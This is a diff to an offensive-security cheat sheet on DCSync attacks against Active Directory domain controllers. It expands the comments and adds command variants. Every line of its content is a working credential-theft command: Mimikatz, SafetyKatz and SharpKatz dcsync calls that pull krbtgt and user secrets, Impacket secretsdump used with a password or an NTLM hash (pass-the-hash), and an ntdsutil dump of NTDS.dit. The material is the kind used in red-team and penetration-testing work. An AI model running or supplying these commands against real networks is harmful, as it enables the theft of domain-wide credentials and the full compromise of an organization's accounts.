@@ -1,10 +1,22 @@
-% DCSync attack
+% DCSync (Domain Controller Synchronization)
 
-# Invoke-Mimikatz
+# Perform a DCSync attack with Mimikatz to replicate the krbtgt account secrets
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<krbtgt-user-name>"'
 
-# Safetykatz
+# Perform a targeted DCSync for a specific user and domain
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<username>"'
+
+# Perform a DCSync with SafetyKatz (fork of Mimikatz)
 Safetykatz.exe "lsadump::dcsync /user:<krbtgt-user-name>" "exit"
 
-# Sharpkatz
-SharpKatz.exe --Command dcsync --User <domainpart>\krbtgt --Domain <FQDN> --DomainController <dc-hostname>
+# Perform a DCSync with SharpKatz (C# port of Mimikatz) for AES keys
+SharpKatz.exe --Command dcsync --User <domainpart>\<krbtgt-user-name> --Domain <FQDN> --DomainController <dc-hostname>
+
+# Perform a DCSync using Impacket secretsdump (Linux) against a Domain Controller (requires credentials)
+python3 secretsdump.py -just-dc <domain>/<username>:<password>@<dc-hostname>
+
+# Perform a DCSync using Impacket secretsdump with NTLM hash instead of password
+python3 secretsdump.py -just-dc <domain>/<username>@<dc-hostname> -hashes <ntlmhash>
+
+# Perform a full NTDS.dit and SYSTEM hive dump using ntdsutil (requires local admin on Domain Controller)
+ntdsutil "ac i ntds" "ifm" "create full <backup-folder>" quit quit
